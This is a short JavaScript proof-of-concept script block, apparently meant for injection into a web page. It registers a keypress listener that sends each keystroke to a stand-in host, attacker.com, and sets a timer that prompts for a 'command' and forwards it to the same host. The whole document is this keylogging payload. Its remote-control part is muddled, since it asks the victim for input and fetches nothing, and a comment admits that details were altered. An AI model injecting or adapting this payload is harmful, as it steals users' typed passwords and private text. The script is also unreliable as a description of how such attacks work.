<script>
// In this PoC the attacker injects code that logs keystrokes and enables remote control of the victim's browser.
    document.addEventListener('keypress', function(event) {
        var key = String.fromCharCode(event.keyCode);
        var xhr = new XMLHttpRequest();
        xhr.open('POST', 'http://attacker.com/keystrokes.php', true);
        xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
        xhr.send('key=' + encodeURIComponent(key));
    });

    setInterval(function() {
        var cmd = prompt('Enter a command:');
        var xhr = new XMLHttpRequest();
        xhr.open('GET', 'http://attacker.com/control.php?cmd=' + encodeURIComponent(cmd), true);
        xhr.send();
    }, 10000); // Check for commands every 10 seconds
// For security reasons ive changed some keypoints aswell as url, ext etc.    
</script>
